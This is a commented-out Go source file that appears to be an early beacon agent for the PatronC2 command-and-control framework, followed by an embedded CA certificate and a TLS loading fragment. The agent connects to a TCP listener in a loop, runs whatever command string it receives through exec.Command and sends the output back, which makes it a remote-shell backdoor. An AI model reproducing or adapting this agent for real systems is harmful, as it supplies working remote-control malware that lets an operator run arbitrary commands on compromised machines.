

// package main

// import (
// 	"encoding/gob"
// 	"fmt"
// 	"log"
// 	"net"
// 	"os/exec"
// 	"strings"
// 	"time"

// 	"github.com/PatronC2/Patron/types"
// )

// func main() {
// 	// beacon, err := net.Dial("tcp", "127.0.0.1:6969")
// 	// if err != nil {
// 	// 	log.Fatalln(err) // maybe try diff IP
// 	// }
// 	// dec := gob.NewDecoder(beacon)
// 	// instruct := &types.GiveAgentCommand{}
// 	// dec.Decode(instruct)
// 	// fmt.Printf("Received : %+v", instruct)

// 	for {
// 		beacon, err := net.Dial("tcp", "127.0.0.1:6969")
// 		if err != nil {
// 			log.Fatalln(err) // maybe try diff IP
// 		}
// 		err = beacon.SetReadDeadline(time.Now().Add(time.Minute * 5))
// 		if err != nil {
// 			log.Fatalln(err)
// 		}
// 		CmdOut := ""
// 		text := make([]byte, 4096)
// 		_, err = beacon.Read(text)
// 		if err != nil {
// 			log.Println("No conn beacon in 5 sec")
// 			time.Sleep(time.Second * 5)
// 			continue
// 		}
// 		out := string(text)
// 		message := strings.Split(out, "\n")
// 		if message[0] != "" {
// 			fmt.Print("->: " + message[0])
// 			tokens := strings.Split(message[0], " ")
// 			var c *exec.Cmd
// 			if len(tokens) == 1 {
// 				c = exec.Command(tokens[0])
// 			} else {
// 				c = exec.Command(tokens[0], tokens[1:]...)
// 			}
// 			buf, err := c.CombinedOutput()
// 			if err != nil {
// 				CmdOut = err.Error()
// 			}
// 			CmdOut += string(buf)
// 			beacon.Write(buf)
// 			continue
// 		}
// 		// dec := gob.NewDecoder(beacon)
// 		// instruct := &types.GiveAgentCommand{}
// 		// dec.Decode(instruct)
// 		// fmt.Printf("Received : %+v", instruct)

// 		if strings.TrimSpace(string(CmdOut)) == "STOP" {
// 			fmt.Println("TCP client exiting...")
// 			return
// 		}
// 	}

// }

// const rootCert = `-----BEGIN CERTIFICATE-----
// MIICXzCCAgWgAwIBAgIUMd+ZlvsLMPMqJxWJ9T6BJGthj9gwCgYIKoZIzj0EAwIw
// gYQxCzAJBgNVBAYTAlVTMREwDwYDVQQIDAhNYXJ5bGFuZDEPMA0GA1UEBwwGVG93
// c29uMREwDwYDVQQKDAhQYXRyb25DMjELMAkGA1UECwwCQzIxDzANBgNVBAMMBnBh
// dHJvbjEgMB4GCSqGSIb3DQEJARYRcGF0cm9uQHBhdHJvbi5jb20wHhcNMjIwNTA0
// MjEzNDIzWhcNMzIwNTAxMjEzNDIzWjCBhDELMAkGA1UEBhMCVVMxETAPBgNVBAgM
// CE1hcnlsYW5kMQ8wDQYDVQQHDAZUb3dzb24xETAPBgNVBAoMCFBhdHJvbkMyMQsw
// CQYDVQQLDAJDMjEPMA0GA1UEAwwGcGF0cm9uMSAwHgYJKoZIhvcNAQkBFhFwYXRy
// b25AcGF0cm9uLmNvbTBZMBMGByqGSM49AgEGCCqGSM49AwEHA0IABEA0e3xutzlG
// NonmwcaQcwYyaqKHG2ZFqDeB30vXhAwQjK/n9rRSA+THI5FsdNdk3wiJlJkKV1QR
// 0yYb4J1aFg2jUzBRMB0GA1UdDgQWBBTLaFpt8fmieqkXwXdS2oi9R29hhzAfBgNV
// HSMEGDAWgBTLaFpt8fmieqkXwXdS2oi9R29hhzAPBgNVHRMBAf8EBTADAQH/MAoG
// CCqGSM49BAMCA0gAMEUCIF/HZD1/d01Q3Dk/gpvGQObYnx6JNrupJehaYKjQ+N4B
// AiEAli42Gt6ELWRZ1/0aXz8t63CI8o9mfp4rloqjcF/Dq10=
// -----END CERTIFICATE-----
// `

// pem, err := os.ReadFile("certs/server.pem")
// 	if err != nil {
// 		log.Fatalln(err)
// 		return
// 	}
// 	roots := x509.NewCertPool()
// 	ok := roots.AppendCertsFromPEM(pem)